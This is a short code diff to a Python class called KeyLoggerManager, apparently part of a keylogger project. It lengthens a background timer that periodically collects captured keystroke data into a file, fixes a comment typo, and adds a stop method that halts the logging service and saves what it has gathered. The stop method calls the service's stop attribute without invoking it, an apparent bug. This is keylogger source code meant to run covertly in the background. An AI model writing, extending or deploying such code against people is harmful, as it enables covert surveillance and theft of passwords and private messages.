@@ -41,7 +41,7 @@ class KeyLoggerManager:
         self.__write(data_to_write=data_for_file)          
 
     def start_get_data_counter(self):
-        t = threading.Timer(3.0, self.start_get_data_counter)
+        t = threading.Timer(5.0, self.start_get_data_counter)
         t.daemon = True
         t.start()
         
@@ -51,9 +51,13 @@ class KeyLoggerManager:
         '''
         Runs the program in the background
         '''
-        if self.key_logger_service.start: # Try running the service, if it does start counter for getting the data every feew minutes
-            self.start_get_data_counter()   
+        if self.key_logger_service.start: # Try running the service, if it does start counter for getting the data every few minutes
+            self.start_get_data_counter()
 
+        # Stop the service and returns the data
+    def stop(self):
+        self.key_logger_service.stop
+        self.__get_and_add_data_to_file()
 
 
 
